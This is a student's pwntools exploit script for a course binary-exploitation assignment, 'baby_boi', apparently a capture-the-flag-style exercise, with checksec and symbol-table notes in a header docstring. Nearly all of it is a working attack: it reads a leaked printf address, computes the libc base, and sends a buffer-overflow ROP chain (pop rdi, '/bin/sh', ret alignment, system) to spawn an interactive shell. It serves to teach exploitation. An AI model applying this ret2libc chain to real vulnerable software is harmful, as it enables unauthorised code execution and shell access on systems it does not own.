'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP13: baby_bi
File Description:  Using PLT and GOT to call system from calculating offsets

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68) Symbols       No    0               2               baby_boi

File info:
baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped

Radare2:
afl --> list all functions


GLIBC VERSION

 objdump -T baby_boi 

baby_boi:     file format elf64-x86-64

DYNAMIC SYMBOL TABLE:
0000000000000000      DF *UND*  0000000000000000 (GLIBC_2.2.5) puts
0000000000000000      DF *UND*  0000000000000000 (GLIBC_2.2.5) __libc_start_main
0000000000000000  w   D  *UND*  0000000000000000              __gmon_start__
0000000000000000      DF *UND*  0000000000000000 (GLIBC_2.2.5) gets
0000000000000000      DF *UND*  0000000000000000 (GLIBC_2.2.5) setvbuf
0000000000601040 g    DO .bss   0000000000000008 (GLIBC_2.2.5) stdout
0000000000601050 g    DO .bss   0000000000000008 (GLIBC_2.2.5) stdin
0000000000000000      DF *UND*  0000000000000000 (GLIBC_2.2.5) printf
0000000000601060 g    DO .bss   0000000000000008 (GLIBC_2.2.5) stderr

Library offsets according to blukat alt
https://libc.nullbyte.cat/?q=printf%3A9b0
'''

# Import libraries
from pwn import *


# Set up ELF
elf = ELF("./baby_boi")

# Set up varibles
printfOffset='0x0509b0'      # Offset from libc in hex
printOffsetint=int(printfOffset, 16)
padding=b'a'*40  # Padding to get to rip via overflow    32 stack, 8 byte rbp
poprdi=p64(0x400793)    # Pop shell for system call to use
retgad=p64(0x40054e)       # stack align

# Set up process and set up leak
p=process("./baby_boi")
resp=p.recvuntil(b": ")  # Recieve up to start of the leak
leak=p.recvuntil(b"\n")  # Leak from printf
leakint=int(leak,16)     # L3ak to int

# Find start of libc
libc = elf.libc         # Save local copy of binary libc
libcStart = leakint - libc.sym.printf #printOffsetint       # Find start of libc
libc.address = libcStart        # Start with base, call anything else

# Craft payload
binsh = p64(next(libc.search(b'/bin/sh\x00')))
libsys = p64(libc.sym.system)
payload = padding + poprdi + binsh + retgad + libsys
p.sendline(payload)
p.interactive()

